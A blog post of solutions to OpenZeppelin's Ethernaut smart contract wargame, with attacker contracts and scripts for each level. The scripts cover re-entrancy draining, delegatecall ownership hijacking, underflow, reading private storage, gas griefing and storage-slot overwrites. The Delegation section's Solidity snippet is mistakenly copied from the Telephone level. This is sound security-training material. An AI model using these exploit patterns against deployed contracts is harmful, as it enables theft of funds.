---
title: Ethernaut Solutions
date: 2021-01-10
image: ./featured.png
categories:
  - Tech
  - ETH
  - security
medium:
  - eos
  - Programming
  - blockchain
  - cryptocurrency
  - javascript
steem:
  - eos
  - utopian-io
  - steemdev
  - programming
  - cryptocurrency
---

[Ethernaut](https://ethernaut.openzeppelin.com) is OpenZeppelin's wargame to learn about Ethereum smart contract security.
It launched a couple of years ago and consists of 21 challenges that need to be solved.
I personally found the Ethernaut challenges to be easier than the challenges of Capture the Ether, another CTF. If you have no prior Ethereum and security background this might be a good place to start.
The challenges are on the Rinkeby testnet which makes the setup and receiving testnet ether a bit inconvenient as there are currently no easy to use faucets.

What I did was to solve all challenges using [hardhat](https://hardhat.org/) in my local environment which made testing my exploits locally very easy.
I wrote custom code that forks rinkeby, creates a custom smart contract challenge instance for me, runs my exploit code, and then checks for correctness using my local environment.
My solutions [can be found here](https://github.com/MrToph/ethernaut).
If you prefer solving the challenges this way as well, instead of using a testnet, you can clone my repo, have a look at the first warmup challenge `test/0-hello.ts` and implement the rest of the challenges in a similar way.

Let's go over all of Ethernaut's challenges and discuss their solutions.

# Challenges

## 0. Hello

The first challenge gets you accustomed to the usual way each challenge needs to be set up.
Using the Chrome developer tools you can see the level address that will be used to create a challenge contract instance for you.
You can call `contract.abi` in the console to see the available functions to call on the contract.
After calling the various `info` functions you receive a hint that you need to call the `authenticate` function with a password to pass this level.
The password can be retrieved by the `password()` function and is `ethernaut0`.


## 1. Fallback

The goal is to become the owner of the contract.
The contract is quite easy to understand and we can see that the owner can be reset by calling the `fallback` function, i.e., we just do an ether transfer to the contract (empty data field in the transaction).
To pass the checks, we first need to call `contribute` once.

## 2. Fallout

What looks like the constructor is just a misspelt function `Fal1out` that can be called by anyone to claim ownership.

## 3. Coin Flip

The goal is to correctly predict the coin flip 10 times in a row.
The contract uses the previous blockhash as the flip outcome.
We can easily solve this challenge by deploying a custom contract simulating the exact same coin flipping logic and calling the real challenge contract with this result.

```solidity
pragma solidity ^0.7.3;

interface ICoinFlipChallenge {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    ICoinFlipChallenge public challenge;

    constructor(address challengeAddress) {
        challenge = ICoinFlipChallenge(challengeAddress);
    }

    function attack() external payable {
        // simulate the same what the challenge contract does
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;

        // call challenge contract with same guess
        challenge.flip(side);
    }

    receive() external payable {}
}
```

## 4. Telephone

This level is very easy. You win if you can craft a transaction where `tx.origin != msg.sender` which is true if you call the `changeOwner` function from a smart contract.
Then `msg.sender` will be the helper contract address while `tx.origin` always refers to the original transaction sender (`tx.from`).

```solidity
function attack() external payable {
    challenge.changeOwner(tx.origin);
}
```

## 5. Token

This challenge involves a custom tiny token contract. The goal is to increase our balance.
There is a supposed-to-be overflow check that checks if `require(balances[msg.sender] - _value >= 0);` but we are dealing with unsigned integers which renders this check useless.
To win, we can use an accomplice to send our deployer tokens.

```javascript
const [eoa, accomplice] = await ethers.getSigners();
const eoaAddress = await eoa.getAddress();
// contract uses unsigned integer which is always >= 0, overflow check is useless
tx = await challenge.connect(accomplice)
    // we start with 20 tokens, make sure eoa's balance doesn't overflow as well
    .transfer(eoaAddress, BigNumber.from(`2`).pow(256).sub(`21`));
await tx.wait();
```

## 6. Delegation

There's a delegation contract that forwards any calls using `delegatecall` in its fallback function to a `delegatee` contract.
The thing to know about the `delegatecall` instruction is that the call is executed in the **caller's** context.
Therefore the `delegatee` accesses the `delegator`'s `owner` storage variable and `msg.sender`.
All we need to do is call the `pwn` function on the `delegator contract`.

```solidity
function attack() external payable {
    challenge.changeOwner(tx.origin);
}
```

A very interesting side note is that the gas estimation failed here. The reason for this is that the delegator code does not revert if the inner call failed because it ran out of gas.

> The catch about gas estimation is that the node will try out your tx with different gas values, and return the lowest one for which your tx doesn't fail. But it only looks at your tx, not at any of the internal calls it makes. This means that if the contract code you're calling has a try/catch that causes it not to revert if an internal call does, you can get a gas estimation that would be enough for the caller contract, but not for the callee. - [Falsehoods that Ethereum programmers believe](https://gist.github.com/spalladino/a349f0ca53dbb5fc3914243aaf7ea8c6)

```js
const delegateeAbi = ['function pwn()']
let iface = new ethers.utils.Interface(delegateeAbi)
const data = iface.encodeFunctionData(`pwn`, [])

tx = await eoa.sendTransaction({
  from: await eoa.getAddress(),
  to: challenge.address,
  data,
  gasLimit: BigNumber.from(`100000`),
})
```

## 7. Force

The goal is to send ether to the contract.
Usually, sending ether to a contract requires a fallback function to be implemented, but one can force-send ether by calling the `selfdestruct` instruction on a contract containing ether.
This instruction bypasses any checks.

> The attacker can do this by creating a contract, funding it with 1 wei, and invoking `selfdestruct(victimAddress)`. No code is invoked in `victimAddress`, so it cannot be prevented. This is also true for block reward which is sent to the address of the miner, which can be any arbitrary address. Also, since contract addresses can be precomputed, ether can be sent to an address before the contract is deployed. - [ConsenSys - Secure Development Recommendations](https://consensys.github.io/smart-contract-best-practices/recommendations/#remember-that-ether-can-be-forcibly-sent-to-an-account)

A simple `selfdestruct` contract to solve this challenge looks like this:

```solidity
pragma solidity ^0.7.3;

contract ForceSend {

    constructor (address payable target) payable {
        require(msg.value > 0);
        selfdestruct(target);
    }
}
```

## 8. Vault

The password is stored in storage and everything on the blockchain is public.
The `private` visibility modifier only says that other contracts are not allowed to read it.
Using ethers.js we can still read the storage variable.
Note how the `password` is stored at storage slot 1.

```js
// password is at storage slot 1
const password = await eoa.provider.getStorageAt(challenge.address, 1)
console.log(`password = ${password} "${Buffer.from(password.slice(2), `hex`)}"`)
```

## 9. King

This challenge mimics the original King of the Ether game.
Your goal is to break anyone else calling the claim function.
The claim function sends tokens to our contract, so we just need to write a contract that does not accept tokens.

```solidity
function attack() external payable {
    require(msg.value == 1 ether, "please send exactly 1 ether");
    // claim throne
    // use call here instead of challenge.transfer because transfer
    // has a gas limit and runs out of gas
    (bool success, ) = payable(address(challenge)).call{value: msg.value}("");
    require(success, "External call failed");
}

receive() external payable {
    require(false, "cannot claim my throne!");
}
```

Note that our `attack` function would fail if it used `payable(address(challenge)).transfer` because transfer has a gas limit of 21000.
It's a good idea [to never use `transfer`](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/) and just use the `call` instead.

## 10. Re-Entrancy

This contract has a classic re-entrancy vulnerability.
It should follow the [Checks-Effects-Interactions Pattern](https://docs.soliditylang.org/en/v0.6.11/security-considerations.html) or use OpenZeppelin's ReentrancyGuard function modifiers.

When calling `withdraw` it invokes our contract again before resetting the balance, allowing us to enter the contract again with another withdraw action.

```solidity
contract ReentranceAttacker {
    IReentrance public challenge;
    uint256 initialDeposit;

    constructor(address challengeAddress) {
        challenge = IReentrance(challengeAddress);
    }

    function attack() external payable {
        require(msg.value >= 0.1 ether, "send some more ether");

        // first deposit some funds
        initialDeposit = msg.value;
        challenge.donate{value: initialDeposit}(address(this));

        // withdraw these funds over and over again because of re-entrancy issue
        callWithdraw();
    }

    receive() external payable {
        // re-entrance called by challenge
        callWithdraw();
    }

    function callWithdraw() private {
        // this balance correctly updates after withdraw
        uint256 challengeTotalRemainingBalance = address(challenge).balance;
        // are there more tokens to empty?
        bool keepRecursing = challengeTotalRemainingBalance > 0;

        if (keepRecursing) {
            // can only withdraw at most our initial balance per withdraw call
            uint256 toWithdraw =
                initialDeposit < challengeTotalRemainingBalance
                    ? initialDeposit
                    : challengeTotalRemainingBalance;
            challenge.withdraw(toWithdraw);
        }
    }
}
```

## 11. Elevator

The goal is to set the `top` variable of the Elevator contract to `true`.
The only code path to set this variable is by having the `isLastFloor` function return `false` for the `if` condition and `true` the second time for the variable assignment.

```solidity
Building building = Building(msg.sender);

if (! building.isLastFloor(_floor)) {
  floor = _floor;
  top = building.isLastFloor(floor);
}
```

As we can control the `msg.sender` contract, this is easy to do:

```solidity
// storage, persists throughout function calls
uint256 timesCalled;

function attack() external payable {
    challenge.goTo(0);
}

function isLastFloor(uint256 /* floor */) external returns (bool) {
    timesCalled++;
    if (timesCalled > 1) return true;
    else return false;
}
```

## 12. Privacy

Here, we need to read a "private" storage variable.
The `private` visibility modifier only says that other contracts are not allowed to read it.
Using ethers.js we can still read the storage variable.

Read [this documentation page](https://docs.soliditylang.org/en/v0.6.8/internals/layout_in_storage.html) on how storage is laid out in Solidity.
Basically storage is a mapping function `storage(slot) : 2^256 -> 2^256` from 32-byte integers to 32-byte integers.
Every primitive variable occupies a storage "slot" (index in the 256-bit domain) where it stores its data.
Several continuous variables that occupy less than 256-bit storage space can be packed into a single one.
More complex data structures where the size is not known at compile-time like mappings, or **dynamically**-sized arrays use hash-functions to compute where to store each entry.

The contract's storage will look like this:

```bash
0:       0x0000000000000000000000000000000000000000000000000000000000000001 (1)
1:       0x000000000000000000000000000000000000000000000000000000005ff64a80 (1609976448)
2:       0x000000000000000000000000000000000000000000000000000000004a80ff0a (now=0x4a80, 255=0xff, 10=0xa)
3:       0x8de895aac60c474d0d1bd8fdb7fdc79a6f069101c77f810605e4520f72566874 (data[0])
4:       0xe514d3b3085d092bcc598cc8357dbadc60b34b4cd6af88333e9e8aad9af81c9a (data[1])
5:       0x35c226031a34414845c12c4d7a7e817d3e639e98f9a89258e3a249c3427da3e4 (data[2])
6:       0x0000000000000000000000000000000000000000000000000000000000000000 (0)
```

We're looking for `bytes16(data[2])` which is located at storage slot `&data[0] + 2 = 5`.
Converting the `bytes32` type to `bytes16` uses the first 16 bytes (most significant bits), i.e, `data[2][0..15]`.

```javascript
const keyData = await eoa.provider.getStorageAt(
  challenge.address,
  5 /* data[2] */
)
const key16 = `${keyData.slice(0, 34)}` // bytes16 = 16 bytes = 32 hex chars, +2 for 0x prefix
```

## 13. Gatekeeper One

In this challenge we need to call a function and pass its three modifier checks:

1. The first one requires the transaction to be sent from a smart contract.
2. The second one requires the remaining gas at this point to be a multiple of `8191`.
3. The third one is a riddle on the function argument that we need to solve.

We arrive at a solution by approaching them in a different order.

The first one is easy and obvious to pass.

For the third one I used hardhat's solidity logging feature to print the results of the conversions. Using a `gatekey` byte array that is easy to reason about `0x1122334455667788`, the involved values are:

```solidity
modifier gateThree(bytes8 _gateKey) {
    console.logBytes8(_gateKey);
    console.log("uint32(uint64(_gateKey)) %s", uint32(uint64(_gateKey)) );
    console.log("uint64(_gateKey) %s", uint64(_gateKey));
    console.log("uint16(tx.origin) %s", uint16(tx.origin));
    require(
        uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
        "GatekeeperOne: invalid gateThree part one"
    );
    require(
        uint32(uint64(_gateKey)) != uint64(_gateKey),
        "GatekeeperOne: invalid gateThree part two"
    );
    require(
        uint32(uint64(_gateKey)) == uint16(tx.origin),
        "GatekeeperOne: invalid gateThree part three"
    );
    _;
}
// _gateKey = 0x1122334455667788
// uint32(uint64(_gateKey)) 0x55667788 = 1432778632
// uint64(_gateKey) 0x1122334455667788 = 1234605616436508552
// uint16(tx.origin) 0xD74C = 55116
// tx.orign = 0x48490375809Cf5Af9D635C7860BD7F83f9f2D74c
```

We need to pass in an 8-byte array. Each check compares a value to `uint32(uint64(_gateKey))` which are the lower bits `gateKey[4-7]`.
Let's start from front to back with `0x0000000000000000`. The last two bytes need to equal the last two bytes of our eoa address which in our case is `D74c`.

```javascript
const uint16TxOrigin = address.slice(-4)
const gateKey = `0x000000000000${uint16TxOrigin}`
```

Keeping the zeroes in the lower 4 bytes already passes the first check.
To also pass the second one, the total number needs to be different but we cannot change the lower 4 bytes. So we just flip something in the upper bytes.

```javascript
const gateKey = `0x100000000000${uint16TxOrigin}`
```

The final modifier check that we need to pass is the second `gasleft() % 8191` check.
Note that the gas costs per instruction can change with different hard forks.
It's probably easiest to solve this using a debugger.
But as I am running everything on a local testnet, I can just brute-force the gas costs trying 8191 different consecutive values.
It only takes a couple of seconds.

```solidity
function attack(bytes8 gateKey, uint256 gasToUse) external payable {
    challenge.enter{gas: gasToUse}(gateKey);
}

// brute force this using local hardhat network
const MOD = 8191
const gasToUse = 800000
for(let i = 0; i < MOD; i++) {
  console.log(`testing ${gasToUse + i}`)
  try {
    tx = await attacker.attack(gateKey, gasToUse + i, {
      gasLimit: `950000`
    });
    break;
  } catch {}
}
```

## 14. Gatekeeper Two

The second gatekeeper challenge is a bit easier. Again some modifier checks need to be passed.
The `enter` function needs to be called from a contract again but its code size needs to be zero.
However, `extcodesize` only returns the correct value once the contract is constructed.
While the constructor of our contract is executing it'll return zero.
Which means we will need to call the `enter` function from our constructor with the correct `gatekey` value.
The `gatekey` value can easily be computed within the same contract if we know that `xor` forms an abelian group and each element is its own inverse, i.e., it's commutative and `x ^ x == 0`.

```python
# a = keccak(contract), b = gateKey, c = uint64(-1)
a ^ b == c
a ^ b ^ (b ^ c) == c ^ (b ^ c)
a ^ (b ^ b) ^ c == (c ^ c) ^ b
a ^ 0 ^ c == 0 ^ b
a ^ c == b
```

Here's the final contract:

```solidity
contract GatekeeperTwoAttacker {
    using SafeMath for uint256;
    IGatekeeperTwo public challenge;

    constructor(address challengeAddress) {
        challenge = IGatekeeperTwo(challengeAddress);
        // must attack already in constructor because of extcodesize == 0
        // while the contract is being constructed
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1);
        challenge.enter(bytes8(gateKey));
    }
}
```

## 15. Naught Coin

For this challenge, you need to be familiar with ERC20 tokens and their functions.
The challenge consists of a lockup contract inheriting from ERC20 tokens.
Its `transfer` function has been overwritten to check that one can only withdraw tokens after some time has passed.
However, `transfer` is not the only function in ERC20 that allows for moving tokens. We can combine `allow` and `transferFrom` to transfer tokens. Both functions exist on the lockup contract in their original form due to inheritance and have not been explicitly overwritten.

## 16. Preservation

There is a contract storing another contract address which is called using a `delegatecall` instruction.
This is the same exploit as in challenge _6. Delegation_.

> The thing to know about the `delegatecall` instruction is that the call is executed in the **caller's** context.

First, we call `setFirstTime` on the challenge contract to overwrite the library address with our malicious library.
Using a second call to `setFirstTime`, the challenge contract invokes the `setTime` function **of our contract** which has the exact same storage layout as the challenge contract.
In our malicious `setTime` function, we simply overwrite the third storage slot (`owner`).

```solidity
interface IPreservation {
    function setFirstTime(uint _timeStamp) external;
}

// this one will be called by delegatecall
contract PreservationAttackerLib {
    // needs same storage layout as Preservation, i.e.,
    // we want owner at slot index 2
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = tx.origin;
    }
}

contract PreservationAttacker {
    IPreservation public challenge;
    PreservationAttackerLib public detour;

    constructor(address challengeAddress) {
        challenge = IPreservation(challengeAddress);
        detour = new PreservationAttackerLib();
    }

    function attack() external {
      // 1. change the library address to our evil detour lib
      // this works because their LibraryContract is invoked using delegatecall
      // which executes in challenge contract's context (uses same storage)
      challenge.setFirstTime(uint256(address(detour)));

      // 2. now make challenge contract call setTime function of our detour
      challenge.setFirstTime(0);
    }
}
```

## 17. Recovery

There is a factory contract that has been called to create a new contract instance.
Someone deposited funds on this contract instance but "forgot the address".
Our goal is to find out what address the contract was deployed to and call its `destroy` function.

This challenge is very easy if we use a block explorer and investigate the transactions related to the factory contract.
Alternatively, we can recompute the contract address.
Contract addresses are fully derived from the [sender and the transaction's nonce](http://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed) as:

```solidity
// last 20 bytes of hash of rlp encoding of tx.origin and tx.nonce
keccak256(rlp(senderAddress, nonce))[12:31]
```

There is a second way to create contracts using `CREATE2` that results in a different address but this factory contract uses the standard one.
Using ethers, a call to `getContractAddress` is enough to do the above-mentioned computation.

```javascript
const recomputedContractAddress = ethers.utils.getContractAddress({
  from: challenge.address,
  nonce: BigNumber.from(`1`),
})

// call destroy on it
```

## 18. MagicNumber

For this challenge, you need to handcraft a payload to deploy a contract that returns `42`.
The idea here is to use the least amount of opcodes (at most 10 are allowed) to achieve this goal, so we will write a smart contract that returns 42 whenever it is called regardless of the function name.
A deployment transaction consists of the actual contract bytecode and the initialization code.
[Here is a great writeup](https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2) about the individual opcodes that are needed to write the EVM assembly code.
In short, the `return` instruction requires the return value to be stored in memory instead of just popping it from the stack as other languages do.
Our contract bytecode then consists of storing this value in memory and returning a pointer to it.

```solidity
602a    // v: push1 0x2a (value is 0x2a)
6000    // p: push1 0x00 (memory slot is 0x00)
52      // mstore
6020    // s: push1 0x20 (value is 32 bytes in size)
6000    // p: push1 0x00 (value was stored in slot 0x00)
f3      // return
```

The initialization code needs to return the contract code which then stores it in the blockchain state.
We can copy our code using the `CODECOPY` instruction.

The final sequence is:

```python
600a600c600039600a6000f3602a60005260206000f3
```

Creating this contract and setting the solver to the new address can be done using a factory contract. We can specify the full contract payload using the `create2` assembly instruction.

```solidity
function attack() public {
    bytes memory bytecode = hex"600a600c600039600a6000f3602a60005260206000f3";
    bytes32 salt = 0;
    address solver;

    assembly {
        solver := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
    }

    challenge.setSolver(solver);
}
```

## 19. Alien Codex

In this challenge, we need to set the owner variable to zero.
It's important to understand the storage layout here.
The contract inherits from the `Ownable` contract.
In this case, the `Ownable` contract's storage variables are laid out first.
It consists of a single 20-byte `owner` address.
Afterwards, the challenge contract's `contact` boolean is defined which still fits into the same first 32-byte storage slot.
Then, a **dynamically-sized** `bytes32` array is defined.

> In the case of a dynamic array, the reserved slot p contains the length of the array as a uint256, and the array data itself is located sequentially at the address keccak256(p).
>
> - [Ref 1](https://github.com/Arachnid/uscc/tree/master/submissions-2017/doughoyte#solidity-storage-layout), [Ref 2](https://docs.soliditylang.org/en/v0.6.8/internals/layout_in_storage.html#mappings-and-dynamic-arrays)

The storage then looks like this:

```python
slot 0: owner, contact
slot 1: codex.length
// ...
slot keccak(1): codex[0]
slot keccak(1) + 1: codex[1]
slot keccak(1) + 2: codex[2]
slot keccak(1) + 3: codex[3]
slot keccak(1) + 4: codex[4]
// ...
```

Note that the array items wrap around after they reached the max storage slot of `2^256 - 1`.
Using a bit of math we can find the codex index that writes to the `owner` variable at storage slot 0:

```bash
need to find array index that maps to 0 mod 2^256
i.e., keccak(1) + index mod 2^256 = 0
<=> index = -keccak(1) mod 2^256
<=> index = 2^256 - keccak(1) as keccak(1) is in range
```

The following functions then need to be invoked to solve the challenge:

```javascript
// we need to make contract first to pass the modifier checks of other functions
tx = await challenge.make_contact();
await tx.wait();

// all of contract storage is a 32 bytes key to 32 bytes value mapping
// first make codex expand its size to cover all of this storage
// by calling retract making it overflow
tx = await challenge.retract();
await tx.wait();

// now try to index the map in a way such that we write to the owner variable at slot 0
// codex[0] value is stored at keccak(codexSlot) = keccak(1)
// codexSlot = 1 because slot 0 contains both 20 byte address (owner) & boolean
// needs to be padded to a 256 bit
const codexBegin = BigNumber.from(
    ethers.utils.keccak256(
        `0x0000000000000000000000000000000000000000000000000000000000000001`
    )
);
const ownerOffset = BigNumber.from(`2`).pow(`256`).sub(codexBegin);

const eoaAddress = await eoa.getAddress()
tx = await challenge.revise(ownerOffset, ethers.utils.zeroPad(eoaAddress, 32));
await tx.wait();
```

## 20. Denial

The goal is to make the `withdraw` call fail.
We control the `partner` contract.
The contract writer's idea was that even if we revert in our contract using `revert` / `require` only our function call would fail but the withdrawal to the original owner would still continue.
While this is true, notice that our function is being called using `.call` without specifying an explicit gas limit.
We can just consume all available gas in the transaction resulting in the caller function to be out of gas and fail.
Contrary to `revert` and `require`, the `assert` instruction consumes all gas.

```solidity
contract DenialAttacker {
    fallback() external payable {
      // assert consumes all (!) gas
      assert(false);
    }
}
```

## 21. Shop

The goal is to buy the item for less than its `price`.
This is the same as the 11th **Elevator** challenge just with a gas restriction on the two calls.

We need to find a way to distinguish the two calls and return `100` for the first one and `0` for the second one.
Notice how the challenge contract's `isSold` storage variable is being changed in-between these calls.
We can make use of this to distinguish both calls:

```solidity
abstract contract IShop {
    uint public price;
    bool public isSold;
    function buy() external virtual;
}

contract ShopAttacker {
    IShop public challenge;
    uint256 timesCalled = 1;

    constructor(address challengeAddress) {
        challenge = IShop(challengeAddress);
    }

    function attack() public {
        challenge.buy();
    }

    function price() external view returns (uint256) {
        return challenge.isSold() ? 0 : 100;
    }
}
```

The call still fails because `price()` uses more than the allotted 3000 gas.
This [challenge was written a couple of years ago](https://github.com/OpenZeppelin/ethernaut/issues/156) and gas prices changed on a per instruction-level since then.
This just shows how important it is to not assume anything about gas prices.

I don't think that there is a solution that works with the latest Ethereum version, even using `gasleft()` to distinguish the calls seems to run out of gas.


> ❕ The full code for all solutions can be [found on GitHub](https://github.com/MrToph/ethernaut).

- [Damn Vulnerable DeFi](/damn-vulnerable-de-fi-solutions/)
- Ethernaut
- [Capture The Ether](/capture-the-ether-solutions/)
